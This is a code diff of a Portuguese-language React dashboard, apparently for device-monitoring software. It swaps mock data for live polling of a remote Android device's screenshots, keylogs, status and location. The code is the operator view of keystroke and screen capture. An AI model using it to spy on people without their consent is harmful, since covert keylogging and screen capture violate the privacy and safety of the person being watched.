@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useMemo, useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
@@ -17,11 +17,38 @@ export default function DeviceDetails({
   deviceName,
   onBack,
 }: DeviceDetailsProps) {
+  const numericDeviceId = Number(deviceId);
   const [activeTab, setActiveTab] = useState("info");
   const [isLiveActive, setIsLiveActive] = useState(true);
   const [isControlActive, setIsControlActive] = useState(false);
   const [isScreenLocked, setIsScreenLocked] = useState(false);
   const [selectedKeylogs, setSelectedKeylogs] = useState<Set<number>>(new Set());
+
+  const devicesQuery = trpc.device.list.useQuery(undefined, {
+    refetchInterval: 10000,
+  });
+  const screenshotsQuery = trpc.corporate.screenshots.list.useQuery(
+    { deviceId: numericDeviceId, limit: 24 },
+    {
+      enabled: Number.isFinite(numericDeviceId),
+      refetchInterval: isLiveActive ? 3000 : false,
+      refetchOnWindowFocus: true,
+    }
+  );
+
+  const device = useMemo(
+    () => devicesQuery.data?.find((item) => item.id === numericDeviceId),
+    [devicesQuery.data, numericDeviceId]
+  );
+
+  const screenshots = screenshotsQuery.data ?? [];
+  const latestScreenshot = screenshots[0] ?? null;
+  const lastSeenLabel = device?.lastSeen
+    ? new Date(device.lastSeen).toLocaleString("pt-BR")
+    : "Indisponivel";
+  const liveStatusLabel = latestScreenshot
+    ? `Ultima captura em ${new Date(latestScreenshot.createdAt).toLocaleTimeString("pt-BR")}`
+    : "Aguardando primeira captura do dispositivo";
 
   // Fetch keylogs from backend
   const { data: keylogs = [], isLoading: keylogsLoading, refetch: refetchKeylogs } = trpc.keylogs.list.useQuery(
@@ -51,7 +78,7 @@ export default function DeviceDetails({
   });
 
   const handleScreenshot = () => {
-    alert(`📸 Screenshot capturado de ${deviceName}`);
+    screenshotsQuery.refetch();
   };
 
   const handleStopLive = () => {
@@ -224,19 +251,21 @@ export default function DeviceDetails({
                 </div>
                 <div>
                   <p className="text-slate-400 text-sm">Modelo</p>
-                  <p className="font-semibold">Samsung Galaxy A12</p>
+                  <p className="font-semibold">{device?.deviceType || "Android"}</p>
                 </div>
                 <div>
-                  <p className="text-slate-400 text-sm">Sistema Operacional</p>
-                  <p className="font-semibold">Android 11</p>
+                  <p className="text-slate-400 text-sm">Status</p>
+                  <p className="font-semibold">
+                    {device?.status === "online" ? "Online" : "Offline"}
+                  </p>
                 </div>
                 <div>
-                  <p className="text-slate-400 text-sm">Versão</p>
-                  <p className="font-semibold">11.0.1</p>
+                  <p className="text-slate-400 text-sm">Ultimo contato</p>
+                  <p className="font-semibold">{lastSeenLabel}</p>
                 </div>
                 <div>
                   <p className="text-slate-400 text-sm">Localização</p>
-                  <p className="font-semibold">São Paulo, SP</p>
+                  <p className="font-semibold">{device?.location || "Indisponivel"}</p>
                 </div>
               </div>
             </Card>
@@ -246,33 +275,29 @@ export default function DeviceDetails({
               <div className="space-y-3">
                 <div>
                   <div className="flex justify-between mb-1">
-                    <p className="text-slate-400 text-sm">Bateria</p>
-                    <p className="text-cyan-400 font-semibold">85%</p>
+                    <p className="text-slate-400 text-sm">Capturas recebidas</p>
+                    <p className="text-cyan-400 font-semibold">{screenshots.length}</p>
                   </div>
                   <div className="w-full bg-slate-700 rounded-full h-2">
-                    <div className="bg-green-500 h-2 rounded-full" style={{ width: "85%" }}></div>
+                    <div
+                      className="bg-cyan-500 h-2 rounded-full"
+                      style={{ width: `${Math.min(screenshots.length, 24) / 24 * 100}%` }}
+                    ></div>
                   </div>
                 </div>
                 <div>
-                  <div className="flex justify-between mb-1">
-                    <p className="text-slate-400 text-sm">Memória</p>
-                    <p className="text-cyan-400 font-semibold">4.2 GB / 8 GB</p>
-                  </div>
-                  <div className="w-full bg-slate-700 rounded-full h-2">
-                    <div className="bg-blue-500 h-2 rounded-full" style={{ width: "52.5%" }}></div>
-                  </div>
+                  <p className="text-slate-400 text-sm">Feed atual</p>
+                  <p className="text-cyan-400 font-semibold">{liveStatusLabel}</p>
                 </div>
                 <div>
-                  <p className="text-slate-400 text-sm">Sinal</p>
-                  <p className="text-cyan-400 font-semibold">📶 Excelente</p>
-                </div>
-                <div>
-                  <p className="text-slate-400 text-sm">Temperatura</p>
-                  <p className="text-cyan-400 font-semibold">36°C</p>
+                  <p className="text-slate-400 text-sm">Atualização automática</p>
+                  <p className="text-cyan-400 font-semibold">
+                    {isLiveActive ? "Ligada a cada 3 segundos" : "Pausada"}
+                  </p>
                 </div>
                 <div>
                   <p className="text-slate-400 text-sm">Último Acesso</p>
-                  <p className="text-cyan-400 font-semibold">Agora</p>
+                  <p className="text-cyan-400 font-semibold">{lastSeenLabel}</p>
                 </div>
               </div>
             </Card>
@@ -309,14 +334,38 @@ export default function DeviceDetails({
         {/* Aba: Screenshots */}
         <TabsContent value="screenshots" className="space-y-4">
           <Card className="bg-slate-800 border-slate-700 p-6">
-            <h3 className="text-cyan-400 font-bold mb-4">📸 Screenshots Capturados (6)</h3>
-            <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
-              {[1, 2, 3, 4, 5, 6].map((i) => (
-                <div key={i} className="bg-slate-700 rounded-lg aspect-video flex items-center justify-center border border-slate-600 hover:border-cyan-500 transition cursor-pointer">
-                  <p className="text-slate-400">📱 Screenshot {i}</p>
-                </div>
-              ))}
-            </div>
+            <h3 className="text-cyan-400 font-bold mb-4">
+              📸 Screenshots Capturados ({screenshots.length})
+            </h3>
+            {screenshotsQuery.isLoading ? (
+              <p className="text-slate-400 text-center py-8">Carregando screenshots...</p>
+            ) : screenshots.length === 0 ? (
+              <p className="text-slate-400 text-center py-8">
+                Nenhuma captura real recebida ainda para este dispositivo.
+              </p>
+            ) : (
+              <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
+                {screenshots.map((screenshot) => (
+                  <a
+                    key={screenshot.id}
+                    href={screenshot.screenshotUrl ?? screenshot.imageUrl ?? "#"}
+                    target="_blank"
+                    rel="noreferrer"
+                    className="block overflow-hidden rounded-lg border border-slate-600 bg-slate-900 hover:border-cyan-500 transition"
+                  >
+                    <img
+                      src={screenshot.screenshotUrl ?? screenshot.imageUrl ?? ""}
+                      alt={`Screenshot de ${deviceName}`}
+                      className="aspect-video w-full object-cover"
+                    />
+                    <div className="p-3 text-sm text-slate-300">
+                      <p>{new Date(screenshot.createdAt).toLocaleString("pt-BR")}</p>
+                      <p className="text-cyan-400">{screenshot.captureType}</p>
+                    </div>
+                  </a>
+                ))}
+              </div>
+            )}
           </Card>
         </TabsContent>
 
@@ -409,11 +458,44 @@ export default function DeviceDetails({
       {isLiveActive && (
         <div className="mt-8">
           <Card className="bg-slate-800 border-slate-700 p-6">
-            <h3 className="text-cyan-400 font-bold mb-4">
-              🔴 Visualização Ao Vivo
-            </h3>
+            <div className="mb-4 flex items-center justify-between gap-3">
+              <div>
+                <h3 className="text-cyan-400 font-bold">🔴 Visualização Ao Vivo</h3>
+                <p className="text-sm text-slate-400">
+                  Feed real baseado nas ultimas capturas recebidas do dispositivo.
+                </p>
+              </div>
+              <span
+                className={`rounded-full px-3 py-1 text-xs font-bold ${
+                  device?.status === "online"
+                    ? "bg-green-900/30 text-green-300"
+                    : "bg-red-900/30 text-red-300"
+                }`}
+              >
+                {device?.status === "online" ? "Online" : "Offline"}
+              </span>
+            </div>
             <div className="flex justify-center py-8">
-              <PhoneFrame status="Transmissão ao vivo do dispositivo" />
+              <PhoneFrame status={liveStatusLabel}>
+                {screenshotsQuery.isLoading ? (
+                  <div className="flex h-full items-center justify-center text-slate-400">
+                    Carregando tela...
+                  </div>
+                ) : latestScreenshot ? (
+                  <img
+                    src={latestScreenshot.screenshotUrl ?? latestScreenshot.imageUrl ?? ""}
+                    alt={`Tela atual de ${deviceName}`}
+                    className="h-full w-full object-contain bg-black"
+                  />
+                ) : (
+                  <div className="px-6 text-center text-slate-400">
+                    <p className="text-sm">Nenhuma captura real disponivel ainda.</p>
+                    <p className="mt-2 text-xs text-slate-500">
+                      Assim que o dispositivo enviar screenshots, a tela aparece aqui automaticamente.
+                    </p>
+                  </div>
+                )}
+              </PhoneFrame>
             </div>
           </Card>
         </div>
